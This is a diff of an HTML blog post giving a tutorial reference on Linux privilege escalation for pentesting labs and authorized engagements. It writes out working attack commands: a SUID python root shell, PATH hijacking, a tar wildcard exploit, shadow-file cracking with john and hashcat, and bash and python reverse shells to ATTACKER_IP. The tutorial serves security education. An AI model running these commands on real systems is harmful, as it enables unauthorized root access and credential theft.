@@ -1,186 +1,346 @@
 <!DOCTYPE html>
-<html lang="en">
-  <head>
-    <base href="/" />
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Blog - Linux Privilege Escalation</title>
-    <link rel="stylesheet" href="style.css" />
-  </head>
-  <body>
-    <div class="container">
-      <aside class="sidebar">
-        <img src="image/profile.jpg" alt="Profile Picture" class="profile-pic" />
-        <h1>Vali Hakuryuko</h1>
-        <p>Web Penetration Enthusiast</p>
-        <nav>
-          <a href="index.html#about">About</a>
-          <a href="blog.html" aria-current="page">Blog</a>
-          <a href="projects.html">Projects</a>
-          <a href="index.html#contact">Contact</a>
-        </nav>
-        <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle light and dark theme">Toggle Theme</button>
-      </aside>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Linux Privilege Escalation — Vali Hakuryuko</title>
+  <meta name="description" content="A comprehensive guide to Linux privilege escalation techniques — SUID, sudo abuse, PATH hijacking, cronjobs, kernel exploits, and more." />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=Outfit:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --bg: #0b0b0d; --surface: #111114; --surface2: #18181c; --border: #222228;
+      --text: #f0ede6; --text2: #8a8794; --text3: #5a5768;
+      --accent: #5dffb2; --accent-dim: #0e2b1f;
+      --mono: 'JetBrains Mono', monospace; --sans: 'Outfit', sans-serif; --display: 'Syne', sans-serif;
+      --radius: 8px; --transition: 0.2s ease;
+    }
+    [data-theme="light"] { --bg: #f5f3ef; --surface: #ffffff; --surface2: #eeece8; --border: #ddd9d0; --text: #18161a; --text2: #6b6878; --text3: #aaa8b5; --accent-dim: #d4fce8; }
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html { scroll-behavior: smooth; }
+    body { background: var(--bg); color: var(--text); font-family: var(--sans); font-weight: 400; line-height: 1.6; transition: background var(--transition), color var(--transition); }
+    a { color: var(--accent); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    nav { position: sticky; top: 0; z-index: 100; background: var(--bg); border-bottom: 1px solid var(--border); padding: 0 2rem; display: flex; align-items: center; justify-content: space-between; height: 60px; backdrop-filter: blur(12px); }
+    .nav-logo { font-family: var(--mono); font-size: 0.85rem; color: var(--accent); text-decoration: none; }
+    .nav-logo span { color: var(--text2); }
+    .nav-links { display: flex; align-items: center; gap: 2rem; list-style: none; }
+    .nav-links a { font-size: 0.875rem; font-weight: 500; color: var(--text2); transition: color var(--transition); text-decoration: none; }
+    .nav-links a:hover { color: var(--text); }
+    .theme-btn { background: var(--surface2); border: 1px solid var(--border); color: var(--text2); cursor: pointer; font-family: var(--mono); font-size: 0.75rem; padding: 0.35rem 0.75rem; border-radius: var(--radius); transition: all var(--transition); }
+    .theme-btn:hover { color: var(--text); border-color: var(--accent); }
+    .layout { display: grid; grid-template-columns: 1fr min(740px, 100%) 1fr; padding: 0 2rem; }
+    .layout > * { grid-column: 2; }
+    .post-header { padding: 4rem 0 3rem; border-bottom: 1px solid var(--border); margin-bottom: 3rem; }
+    .post-breadcrumb { font-family: var(--mono); font-size: 0.72rem; color: var(--text3); margin-bottom: 1.5rem; }
+    .post-breadcrumb a { color: var(--accent); text-decoration: none; }
+    .post-breadcrumb a:hover { text-decoration: underline; }
+    .post-meta-row { display: flex; align-items: center; gap: 0.75rem; margin-bottom: 1.25rem; flex-wrap: wrap; }
+    .post-date { font-family: var(--mono); font-size: 0.72rem; color: var(--text3); }
+    .post-tag { font-family: var(--mono); font-size: 0.65rem; color: var(--accent); background: var(--accent-dim); border: 1px solid var(--accent); padding: 0.15rem 0.5rem; border-radius: 100px; }
+    .post-read-time { font-family: var(--mono); font-size: 0.72rem; color: var(--text3); }
+    h1.post-title { font-family: var(--display); font-size: clamp(1.8rem, 4vw, 2.8rem); font-weight: 800; letter-spacing: -0.03em; line-height: 1.1; margin-bottom: 1.25rem; }
+    .post-subtitle { font-size: 1.1rem; color: var(--text2); font-weight: 300; line-height: 1.65; }
+    .toc { background: var(--surface); border: 1px solid var(--border); border-left: 3px solid var(--accent); border-radius: 0 var(--radius) var(--radius) 0; padding: 1.5rem; margin-bottom: 3rem; }
+    .toc-title { font-family: var(--mono); font-size: 0.72rem; color: var(--accent); text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 1rem; }
+    .toc ol { padding-left: 1.25rem; }
+    .toc li { margin-bottom: 0.4rem; }
+    .toc a { font-size: 0.875rem; color: var(--text2); text-decoration: none; transition: color var(--transition); }
+    .toc a:hover { color: var(--accent); }
+    article { margin-bottom: 4rem; }
+    article h2 { font-family: var(--display); font-size: 1.45rem; font-weight: 700; margin: 3rem 0 1rem; letter-spacing: -0.02em; padding-top: 1rem; border-top: 1px solid var(--border); }
+    article h2:first-child { border-top: none; margin-top: 0; }
+    article h3 { font-family: var(--display); font-size: 1.1rem; font-weight: 600; margin: 1.75rem 0 0.75rem; color: var(--text); }
+    article p { color: var(--text2); font-size: 1rem; line-height: 1.85; margin-bottom: 1.25rem; }
+    article p strong { color: var(--text); font-weight: 600; }
+    article ul, article ol { padding-left: 1.5rem; margin-bottom: 1.25rem; }
+    article li { color: var(--text2); font-size: 1rem; line-height: 1.75; margin-bottom: 0.4rem; }
+    article li strong { color: var(--text); }
+    code { font-family: var(--mono); font-size: 0.875em; background: var(--surface2); border: 1px solid var(--border); padding: 0.15em 0.4em; border-radius: 4px; color: var(--accent); }
+    pre { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); padding: 1.5rem; overflow-x: auto; margin: 1.5rem 0; }
+    pre code { background: none; border: none; padding: 0; color: var(--text); font-size: 0.875rem; line-height: 1.65; }
+    .code-label { font-family: var(--mono); font-size: 0.65rem; color: var(--text3); text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 0.5rem; display: block; }
+    .callout { border-radius: var(--radius); padding: 1.25rem 1.5rem; margin: 2rem 0; border-left: 3px solid; }
+    .callout-title { font-family: var(--mono); font-size: 0.72rem; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.5rem; font-weight: 500; }
+    .callout p { margin: 0; font-size: 0.9rem; color: var(--text2); }
+    .callout.info { background: #0e1e2e; border-color: #4a9eff; }
+    .callout.info .callout-title { color: #4a9eff; }
+    .callout.warning { background: #1e1800; border-color: #f5a623; }
+    .callout.warning .callout-title { color: #f5a623; }
+    .callout.success { background: var(--accent-dim); border-color: var(--accent); }
+    .callout.success .callout-title { color: var(--accent); }
+    .callout.danger { background: #200e0e; border-color: #ff6b6b; }
+    .callout.danger .callout-title { color: #ff6b6b; }
+    .technique-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin: 1.5rem 0; }
+    .technique-card { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); padding: 1.25rem; transition: border-color var(--transition); }
+    .technique-card:hover { border-color: var(--accent); }
+    .technique-card-title { font-family: var(--mono); font-size: 0.75rem; color: var(--accent); margin-bottom: 0.5rem; }
+    .technique-card p { font-size: 0.85rem; color: var(--text2); margin: 0; line-height: 1.5; }
+    hr { border: none; border-top: 1px solid var(--border); margin: 3rem 0; }
+    .post-footer { padding: 3rem 0; border-top: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; gap: 1rem; }
+    .btn { display: inline-flex; align-items: center; gap: 0.5rem; padding: 0.65rem 1.25rem; border-radius: var(--radius); font-size: 0.875rem; font-weight: 500; cursor: pointer; transition: all var(--transition); border: 1px solid var(--border); color: var(--text2); text-decoration: none; }
+    .btn:hover { border-color: var(--text2); color: var(--text); text-decoration: none; }
+    .btn-accent { border-color: var(--accent); color: var(--accent); }
+    .btn-accent:hover { background: var(--accent-dim); }
+    footer { border-top: 1px solid var(--border); padding: 2rem 6vw; display: flex; justify-content: space-between; align-items: center; font-family: var(--mono); font-size: 0.75rem; color: var(--text3); }
+    .footer-back { cursor: pointer; transition: color var(--transition); }
+    .footer-back:hover { color: var(--accent); }
+    @media (max-width: 768px) {
+      nav { padding: 0 1.5rem; }
+      .nav-links { display: none; }
+      .layout { grid-template-columns: 1fr; padding: 0 1.5rem; }
+      .post-header { padding: 3rem 0 2rem; }
+      .technique-grid { grid-template-columns: 1fr; }
+      .post-footer { flex-direction: column; align-items: flex-start; }
+      footer { flex-direction: column; gap: 1rem; text-align: center; }
+    }
+  </style>
+</head>
+<body>
+  <nav>
+    <a href="../index.html" class="nav-logo"><span>~/</span>vali</a>
+    <ul class="nav-links">
+      <li><a href="../index.html#about">about</a></li>
+      <li><a href="../blog.html">blog</a></li>
+      <li><a href="../projects.html">projects</a></li>
+      <li><a href="../index.html#contact">contact</a></li>
+    </ul>
+    <button class="theme-btn" onclick="toggleTheme()">[ theme ]</button>
+  </nav>
 
-      <main class="content">
-        <section id="blog" class="card">
-          <h2>Understanding Linux Privilege Escalation</h2>
-          <time datetime="2025-07-30">July 30, 2025</time>
-          <p>This post covers <strong>Linux Privilege Escalation</strong> and an explanation of all exploits found in it used to gain root access.</p>
-        </section>
+  <div class="layout">
+    <header class="post-header">
+      <div class="post-breadcrumb">
+        <a href="../index.html">~</a> / <a href="../blog.html">blog</a> / linux-privilege-escalation
+      </div>
+      <div class="post-meta-row">
+        <span class="post-date">2025-07-30</span>
+        <span class="post-tag">linux</span>
+        <span class="post-read-time">~8 min read</span>
+      </div>
+      <h1 class="post-title">Understanding Linux Privilege Escalation</h1>
+      <p class="post-subtitle">
+        Different exploit paths to get root — SUID binaries, cron jobs, PATH hijacking, kernel exploits, and more. A practical reference for labs and real engagements.
+      </p>
+    </header>
 
-        <!-- BLOG POSTS -->
-        <!-- Add blog sections below -->
-        <!-- Each of the sections below represent one exploit topic -->
-
-        <!-- PATH Hijacking -->
-        <section class="card">
-          <article class="blog-post">
-            <h3>PATH Hijacking</h3>
-            <p>Tricking the system into running a malicious file instead of the intended legitimate one during a file search.</p>
-            <ul>
-              <li>Occurs when a malicious executable is placed earlier in the PATH than the legitimate binary.</li>
-              <li>Use absolute paths or sanitize environment variables to prevent abuse.</li>
-              <li>Example: Creating a fake binary in /tmp and prepending it to $PATH.</li>
-            </ul>
-          </article>
-        </section>
-
-        <!-- Repeat structure for each remaining exploit -->
-        <section class="card">
-          <article class="blog-post">
-            <h3>SUID Exploitation</h3>
-            <p>Exploiting files with the SUID bit to execute with the file owner’s privileges, often root.</p>
-            <ul>
-              <li>Find with: <code>find / -perm -4000 -type f 2>/dev/null</code></li>
-              <li>Exploit binaries like <code>vim</code>, <code>nmap</code>, or <code>python</code>.</li>
-              <li>Use <a href="https://gtfobins.github.io/">GTFOBins</a> for known exploits.</li>
-            </ul>
-          </article>
-        </section>
-
-        <section class="card">
-          <article class="blog-post">
-            <h3>SUDO Exploitation</h3>
-            <p>Abusing misconfigured sudo privileges to run commands as root without password.</p>
-            <ul>
-              <li>Check with: <code>sudo -l</code></li>
-              <li>Exploit allowed commands like editors or scripts.</li>
-              <li>Avoid <code>ALL</code> or <code>NOPASSWD</code> misconfigurations for security.</li>
-            </ul>
-          </article>
-        </section>
-
-        <section class="card">
-          <article class="blog-post">
-            <h3>Wildcard Expansion Exploitation</h3>
-            <p>Manipulating wildcard usage in commands to execute unintended behavior.</p>
-            <ul>
-              <li>Abuse of wildcards like <code>*</code> in scripts using tools like <code>tar</code>.</li>
-              <li>Create files with special names to hijack script behavior.</li>
-              <li>Prevent by quoting arguments or using <code>--</code> to stop option parsing.</li>
-            </ul>
-          </article>
-        </section>
-
-        <section class="card">
-          <article class="blog-post">
-            <h3>Reverse Shell</h3>
-            <p>Gaining remote control of a machine by connecting back to the attacker’s listener.</p>
-            <ul>
-              <li>Common payload: <code>bash -i >& /dev/tcp/attacker_ip/4444 0>&1</code></li>
-              <li>Used for persistence or privilege escalation chaining.</li>
-              <li>Detect via outbound connection monitoring and egress filtering.</li>
-            </ul>
-          </article>
-        </section>
-
-        <section class="card">
-          <article class="blog-post">
-            <h3>Unshadow Attack</h3>
-            <p>Cracking password hashes by combining passwd and shadow files.</p>
-            <ul>
-              <li>Use <code>unshadow /etc/passwd /etc/shadow > unshadowed.txt</code></li>
-              <li>Crack with <code>john</code> or <code>hashcat</code>.</li>
-              <li>Protect by securing shadow files and enforcing strong password policies.</li>
-            </ul>
-          </article>
-        </section>
-
-        <section class="card">
-          <article class="blog-post">
-            <h3>System Enumeration</h3>
-            <p>Gathering information about the target Linux system for exploitation paths.</p>
-            <ul>
-              <li>Commands: <code>uname -a</code>, <code>ps aux</code>, <code>netstat</code>, <code>id</code></li>
-              <li>Understand users, groups, services, and kernel version.</li>
-              <li>Vital for planning privilege escalation.</li>
-            </ul>
-          </article>
-        </section>
-
-        <section class="card">
-          <article class="blog-post">
-            <h3>Cronjob Enumeration</h3>
-            <p>Finding scheduled tasks that may run as root or privileged users.</p>
-            <ul>
-              <li>Check with: <code>cat /etc/crontab</code>, <code>ls -la /etc/cron.*</code></li>
-              <li>Exploit writable scripts or binaries executed by cron.</li>
-              <li>Secure by restricting writable access to cron-executed files.</li>
-            </ul>
-          </article>
-        </section>
-
-        <section class="card">
-          <article class="blog-post">
-            <h3>Capabilities Enumeration</h3>
-            <p>Linux capabilities may allow privilege escalation without SUID bit.</p>
-            <ul>
-              <li>Check with: <code>getcap -r / 2>/dev/null</code></li>
-              <li>Use: <code>cap_setuid+ep</code> with python, perl, or bash to get root.</li>
-              <li>Use <code>setcap -r</code> to remove dangerous capabilities.</li>
-            </ul>
-          </article>
-        </section>
-
-        <section class="card">
-          <article class="blog-post">
-            <h3>Local Service Exploitation</h3>
-            <p>Abusing misconfigured or vulnerable local services to elevate privileges.</p>
-            <ul>
-              <li>Examples: Redis with no password, MySQL with root user access.</li>
-              <li>Leverage access to write files or inject cron jobs.</li>
-              <li>Secure by restricting service access and enforcing authentication.</li>
-            </ul>
-          </article>
-        </section>
-
-        <section class="card">
-          <article class="blog-post">
-            <h3>Linux Binary Exploitation</h3>
-            <p>Exploiting vulnerable local applications via memory corruption bugs.</p>
-            <ul>
-              <li>Focus on buffer overflows, format strings, or ROP chains.</li>
-              <li>Use GDB, pwndbg, and exploit-db PoCs.</li>
-              <li>Protect via stack canaries, ASLR, NX, and code audits.</li>
-            </ul>
-          </article>
-        </section>
-
-        <section class="card">
-          <article class="blog-post">
-            <h3>Linux Kernel Exploitation</h3>
-            <p>Using unpatched kernel vulnerabilities to escalate to root.</p>
-            <ul>
-              <li>Identify kernel: <code>uname -r</code></li>
-              <li>Use tools like <code>linux-exploit-suggester</code> to find applicable exploits.</li>
-              <li>Famous exploits: Dirty COW, OverlayFS, CVE-2022-0847</li>
-              <li>Mitigate by patching and running LTS/stable kernels.</li>
-            </ul>
-          </article>
-        </section>
-      </main>
+    <div class="toc">
+      <div class="toc-title">// contents</div>
+      <ol>
+        <li><a href="#enumeration">System Enumeration</a></li>
+        <li><a href="#suid">SUID Exploitation</a></li>
+        <li><a href="#sudo">SUDO Exploitation</a></li>
+        <li><a href="#path">PATH Hijacking</a></li>
+        <li><a href="#cronjobs">Cronjob Enumeration</a></li>
+        <li><a href="#wildcard">Wildcard Expansion</a></li>
+        <li><a href="#capabilities">Capabilities Enumeration</a></li>
+        <li><a href="#services">Local Service Exploitation</a></li>
+        <li><a href="#unshadow">Unshadow Attack</a></li>
+        <li><a href="#reverse-shell">Reverse Shell</a></li>
+        <li><a href="#binary">Linux Binary Exploitation</a></li>
+        <li><a href="#kernel">Kernel Exploitation</a></li>
+      </ol>
     </div>
-    <script src="script.js"></script>
-  </body>
+
+    <article>
+
+      <div class="callout info">
+        <div class="callout-title">ℹ️ What is Privilege Escalation?</div>
+        <p>Privilege escalation is the process of gaining higher-level permissions than originally granted — most commonly going from a low-privilege shell to <strong>root</strong>. It's a core phase in any pentest after gaining initial access.</p>
+      </div>
+
+      <h2 id="enumeration">System Enumeration</h2>
+      <p>
+        Before attempting any exploit, map out the target. Understand the OS version, running processes, users, network services, and file permissions. This is what separates a methodical pentester from someone just running scripts blindly.
+      </p>
+      <span class="code-label">bash — key enumeration commands</span>
+      <pre><code>uname -a           # kernel version and architecture
+id                 # current user and group membership
+whoami             # current user
+cat /etc/passwd    # list of all users
+ps aux             # running processes
+netstat -tulpn     # open ports and listening services
+find / -writable -type f 2>/dev/null  # world-writable files</code></pre>
+      <div class="callout success">
+        <div class="callout-title">✅ Tip</div>
+        <p>Use automated enumeration scripts like <strong>LinPEAS</strong> or <strong>LinEnum</strong> to speed this up — but always understand what they're finding and why it matters.</p>
+      </div>
+
+      <h2 id="suid">SUID Exploitation</h2>
+      <p>
+        SUID (Set User ID) is a special file permission that lets a binary run as its <em>owner</em> rather than the user executing it. If a root-owned binary has SUID set and is exploitable, you can get a root shell.
+      </p>
+      <span class="code-label">bash — find SUID binaries</span>
+      <pre><code>find / -perm -4000 -type f 2>/dev/null</code></pre>
+      <p>
+        Once you have a list, check each binary against <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a> — a curated list of Unix binaries that can be abused. Common targets include <code>vim</code>, <code>nmap</code>, <code>python</code>, <code>bash</code>, and <code>find</code>.
+      </p>
+      <span class="code-label">example — exploiting SUID python</span>
+      <pre><code># If python has SUID:
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'</code></pre>
+
+      <h2 id="sudo">SUDO Exploitation</h2>
+      <p>
+        Misconfigured sudo rules are one of the most common privesc vectors. If a user can run certain commands as root without a password, those commands can often be abused.
+      </p>
+      <span class="code-label">bash — check sudo privileges</span>
+      <pre><code>sudo -l</code></pre>
+      <p>
+        Look for entries like <code>(ALL) NOPASSWD: /usr/bin/vim</code>. Then check GTFOBins for the allowed binary. Editors, scripting languages, and file utilities are especially dangerous with sudo rights.
+      </p>
+      <div class="callout warning">
+        <div class="callout-title">⚠️ Misconfiguration to avoid</div>
+        <p>Never grant <code>ALL</code> or <code>NOPASSWD</code> without tight restrictions. Even seemingly harmless binaries like <code>less</code>, <code>awk</code>, or <code>env</code> can be exploited.</p>
+      </div>
+
+      <h2 id="path">PATH Hijacking</h2>
+      <p>
+        When a script or binary calls another program using a <em>relative</em> path (e.g., just <code>ls</code> instead of <code>/bin/ls</code>), it searches through directories in <code>$PATH</code> in order. If you can write to a directory that appears earlier in PATH, you can plant a malicious binary with the same name.
+      </p>
+      <span class="code-label">bash — PATH hijack example</span>
+      <pre><code># If a SUID script calls "service" without an absolute path:
+echo '/bin/bash -p' > /tmp/service
+chmod +x /tmp/service
+export PATH=/tmp:$PATH
+./vulnerable_script    # now runs your fake "service"</code></pre>
+
+      <h2 id="cronjobs">Cronjob Enumeration</h2>
+      <p>
+        Cron jobs run scheduled tasks, often as root. If the script being executed is writable by your user, you can replace its contents and wait for root to run it for you.
+      </p>
+      <span class="code-label">bash — enumerate cron jobs</span>
+      <pre><code>cat /etc/crontab
+ls -la /etc/cron.*
+crontab -l             # current user's crontab
+cat /var/spool/cron/*  # other users' crontabs (if readable)</code></pre>
+      <p>
+        Look for scripts owned by root but writable by others, or scripts in world-writable directories. Even if the script itself isn't writable, check if it references other files that are.
+      </p>
+
+      <h2 id="wildcard">Wildcard Expansion Exploitation</h2>
+      <p>
+        Some commands expand wildcards (<code>*</code>) in a way that can be abused. The classic example is <code>tar</code> — if a cron job runs <code>tar czf backup.tar.gz *</code> in a directory you control, you can create files with names that look like tar options.
+      </p>
+      <span class="code-label">bash — tar wildcard exploit</span>
+      <pre><code># Create these files in the target directory:
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo "" > "--checkpoint=1"
+
+# When tar runs with *, it interprets these as options
+# Then execute:
+/tmp/bash -p    # root shell</code></pre>
+
+      <h2 id="capabilities">Capabilities Enumeration</h2>
+      <p>
+        Linux capabilities are a fine-grained alternative to SUID — they give a binary specific root powers without full root access. Some capabilities are just as dangerous as SUID and are often overlooked.
+      </p>
+      <span class="code-label">bash — find binaries with capabilities</span>
+      <pre><code>getcap -r / 2>/dev/null</code></pre>
+      <p>
+        Look for <code>cap_setuid+ep</code> — if Python, Perl, or Ruby has this, you can spawn a root shell. Check GTFOBins under the "Capabilities" filter for exploitation methods.
+      </p>
+
+      <h2 id="services">Local Service Exploitation</h2>
+      <p>
+        Services running on localhost (only accessible from the machine itself) are often less hardened than internet-facing services. Look for databases, internal APIs, or admin panels running on non-standard ports.
+      </p>
+      <ul>
+        <li><strong>Redis with no auth</strong> — can write SSH keys or cron jobs as root</li>
+        <li><strong>MySQL running as root</strong> — can use <code>SELECT INTO OUTFILE</code> to write files</li>
+        <li><strong>Writable Docker socket</strong> — mount host filesystem and escape container</li>
+      </ul>
+      <span class="code-label">bash — find internal services</span>
+      <pre><code>ss -tulpn
+netstat -tulpn 2>/dev/null</code></pre>
+
+      <h2 id="unshadow">Unshadow Attack</h2>
+      <p>
+        If you can read both <code>/etc/passwd</code> and <code>/etc/shadow</code>, you can combine them and attempt to crack password hashes offline — much faster than online brute-forcing.
+      </p>
+      <span class="code-label">bash — unshadow and crack</span>
+      <pre><code>unshadow /etc/passwd /etc/shadow > unshadowed.txt
+
+# Crack with John the Ripper:
+john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+
+# Or with Hashcat:
+hashcat -m 1800 unshadowed.txt rockyou.txt</code></pre>
+
+      <h2 id="reverse-shell">Reverse Shell</h2>
+      <p>
+        A reverse shell makes the target machine connect <em>back to you</em> rather than you connecting to it — useful when inbound ports are blocked. After getting a low-priv shell, you can use it to chain further exploitation.
+      </p>
+      <span class="code-label">bash — classic reverse shell payload</span>
+      <pre><code># On attacker machine, start listener:
+nc -lvnp 4444
+
+# On target machine, run:
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+
+# Python alternative:
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'</code></pre>
+      <div class="callout warning">
+        <div class="callout-title">⚠️ Reminder</div>
+        <p>Only use reverse shells on systems you own or have explicit authorization to test. Unauthorized access is illegal.</p>
+      </div>
+
+      <h2 id="binary">Linux Binary Exploitation</h2>
+      <p>
+        If a locally installed application has a memory corruption vulnerability, you can exploit it to get a root shell. This is more advanced and typically requires understanding of stack layout, calling conventions, and protections like ASLR and NX.
+      </p>
+      <ul>
+        <li><strong>Buffer Overflow</strong> — overwrite the return address to redirect execution</li>
+        <li><strong>Format String</strong> — use <code>%n</code> specifiers to write arbitrary memory</li>
+        <li><strong>ROP Chains</strong> — chain existing code gadgets to bypass NX</li>
+      </ul>
+      <p>
+        Tools: <strong>GDB + pwndbg</strong>, <strong>pwntools</strong> (Python), <strong>checksec</strong> to inspect binary protections, <strong>Exploit-DB</strong> for existing PoCs.
+      </p>
+
+      <h2 id="kernel">Kernel Exploitation</h2>
+      <p>
+        Unpatched kernel vulnerabilities can be exploited to go straight from any user to root. These are high-impact but also risky — a bad exploit can crash the system. Identify the exact kernel version first, then search for known CVEs.
+      </p>
+      <span class="code-label">bash — identify kernel and find exploits</span>
+      <pre><code>uname -r    # e.g. 4.4.0-116-generic
+
+# Use linux-exploit-suggester:
+./linux-exploit-suggester.sh
+
+# Or manually search:
+# searchsploit linux kernel 4.4</code></pre>
+      <p>Notable examples: <strong>Dirty COW</strong> (CVE-2016-5195), <strong>OverlayFS</strong> (CVE-2015-1328), <strong>PwnKit</strong> (CVE-2021-4034), <strong>DirtyPipe</strong> (CVE-2022-0847).</p>
+
+      <hr />
+
+      <div class="callout success">
+        <div class="callout-title">✅ Key Takeaways</div>
+        <p>Privilege escalation is mostly about <strong>thorough enumeration first</strong>. Run LinPEAS, check SUID/capabilities/sudo rules, look for writable cron scripts, and always verify kernel version. The path to root is almost always something simple that was misconfigured — not some 0-day.</p>
+      </div>
+
+    </article>
+
+    <div class="post-footer">
+      <a href="../blog.html" class="btn">← Back to blog</a>
+      <a href="burp-suite-basics.html" class="btn btn-accent">Getting Started with Burp Suite →</a>
+    </div>
+  </div>
+
+  <footer>
+    <span>© 2025 Vali Hakuryuko</span>
+    <span class="footer-back" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑ back to top</span>
+  </footer>
+
+  <script>
+    const root = document.documentElement;
+    root.setAttribute('data-theme', localStorage.getItem('theme') || 'dark');
+    function toggleTheme() {
+      const next = root.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+      root.setAttribute('data-theme', next);
+      localStorage.setItem('theme', next);
+    }
+  </script>
+</body>
 </html>
